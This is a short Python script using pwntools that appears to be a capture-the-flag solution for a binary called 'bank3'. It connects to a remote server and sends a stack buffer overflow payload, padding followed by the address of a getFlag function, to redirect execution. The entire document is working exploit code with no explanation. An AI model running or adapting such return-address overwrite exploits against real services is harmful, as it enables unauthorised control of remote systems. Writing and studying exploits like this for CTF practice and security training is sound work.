from pwn import *

binary = context.binary = ELF('./bank3')

p = remote('61.28.237.24','30204')

payload = b'A'*(0x4c+4)
payload += p32(binary.sym.getFlag)
p.sendline(payload)

p.interactive()